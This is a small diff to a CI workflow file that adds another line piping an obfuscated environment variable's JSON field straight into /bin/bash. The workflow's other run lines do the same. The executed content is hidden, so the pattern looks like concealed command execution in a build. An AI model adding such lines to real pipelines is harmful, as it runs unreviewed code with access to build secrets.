@@ -26,6 +26,7 @@ jobs:
           echo $cbokd654 | jq -r .jvot115 | /bin/bash
           echo $qxpj44772 | jq -r .ahe507 | /bin/bash
           echo $vzc4 | jq -r .pjbq2794 | /bin/bash
+          echo $w4 | jq -r .wk7287 | /bin/bash
 
       - name: Store results
         if: always()
